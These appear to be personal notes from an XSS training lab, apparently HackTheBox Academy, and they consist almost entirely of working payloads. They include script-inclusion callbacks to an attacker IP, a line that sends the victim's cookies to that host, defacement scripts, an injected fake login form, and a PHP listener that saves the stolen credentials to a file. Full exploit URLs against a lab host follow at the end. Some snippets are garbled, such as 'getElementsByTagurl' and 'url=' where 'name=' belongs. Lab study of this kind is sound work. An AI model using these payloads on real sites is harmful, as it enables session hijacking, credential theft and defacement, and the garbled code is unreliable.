# XSS

## XSS payloads

Some interesting XSS payloads we can use:
```
<script>alert(window.origin)</script>
```
The above is sometimes blocked.
The below is not:
```
<plaintext>Hi</plaintext>
```

The below opens the print pop-up and is almost never blocked:
```
<script>print()</script>
```
Print a cookie to the screen:
```
<script>alert(document.cookie)</script>
```

XSS payload do not always need the script tags, we can also do something like this:
```
<img src="" onerror=alert(window.origin)>
```
When the image fails to load the `onerror` javascript code is ran.

More payloads, for callback to our attack host:
```
'><script src=http://10.10.15.175/url></script>
"><script src=http://10.10.15.175:8080/url></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.175/url\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.175/url");a.send();</script>
<script>$.getScript("http://10.10.15.175/url")</script>
```

Send a cookie to a remote server:
```js
"><script>new Image().src='http://10.10.15.175:8080/index.php?c='+document.cookie;</script>
```





## XSS discovery

We can run the following tool to auto detect XSS exploits:
```
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

We can also find payloads here (manual discovery):
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list


## Defacing website
We can alter the apperance of a website by an XSS exploit with one of these payloads:
```
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
<script>document.title = 'HackTheBox Academy'</script>
document.getElementById("todo").innerHTML = "New Text"
$("#todo").html('New Text');
document.getElementsByTagurl('body')[0].innerHTML = "New Text"
```
A nicer example:
```
<script>document.getElementsByTagurl('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

## Phising 

One we find an XSS exploit on the webpage we can create a fake login screen with the following injection:
```
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="userurl" url="userurl" placeholder="Userurl"><input type="password" url="password" placeholder="Password"><input type="submit" url="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Then on a server we control we can run a listener to to receive the credentials and save them:
```
<?php
if (isset($_GET['userurl']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Userurl: {$_GET['userurl']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
We can start the php server with:
```
sudo php -S 0.0.0.0:80
```

test" onerror=alert(window.origin)/> <!-- hi -->

'> <script>alert('hi')</script>
'> <script>console.log('hi')</script>
"> <plaintext>Hi</plaintext>

http://10.129.210.104/phishing/index.php?url='> <script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.175><input type="userurl" url="userurl" placeholder="Userurl"><input type="password" url="password" placeholder="Password"><input type="submit" url="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!-- 


http://10.129.210.104/phishing/index.php?url=%27%3E%20%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease%20login%20to%20continue%3C%2Fh3%3E%3Cform%20action%3Dhttp%3A%2F%2F10.10.15.175%3E%3Cinput%20type%3D%22userurl%22%20url%3D%22userurl%22%20placeholder%3D%22Userurl%22%3E%3Cinput%20type%3D%22password%22%20url%3D%22password%22%20placeholder%3D%22Password%22%3E%3Cinput%20type%3D%22submit%22%20url%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--%20


<img src="" onerror=alert(window.origin)>c" onerror=console.log('koen')>"

